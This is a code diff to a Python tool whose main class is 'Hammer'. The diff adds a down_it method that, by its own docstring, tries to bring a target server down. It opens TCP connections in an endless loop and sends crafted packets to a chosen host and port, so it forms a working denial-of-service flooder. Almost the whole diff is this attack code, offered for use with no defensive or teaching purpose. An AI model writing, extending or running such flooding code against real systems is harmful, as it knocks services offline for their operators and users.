@@ -2,6 +2,7 @@ from termcolor import colored
 from queue import Queue
 import sys
 import socket
+import time
 import random
 
 class FontColors:
@@ -118,8 +119,28 @@ class Hammer:
         
         while True:
             self.queue_one.get()
-            pass
+            self.down_it()
             self.queue_one.task_done()
+    
+    def down_it(self):
+        """
+            Try To down target server with fake request
+        """
+        
+        try:
+            while True:
+                packet = self.packet_creator()
+                h_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                h_socket.connect((self.server, self.port))
+                if h_socket.sendto(packet, (self.server, self.port)):
+                    h_socket.shutdown(1)
+                    print(f"{FontColors.green(time.ctime)}", FontColors.green("<< Harrming Pcket Send << endl"))
+                else:
+                    h_socket.shutdown(1)
+                time.sleep(.1)
+        except socket.error as e:
+            print(FontColors.red("connection! server maybe down"))
+            time.sleep(.1)
     
     def packet_creator(self) -> str:
         """
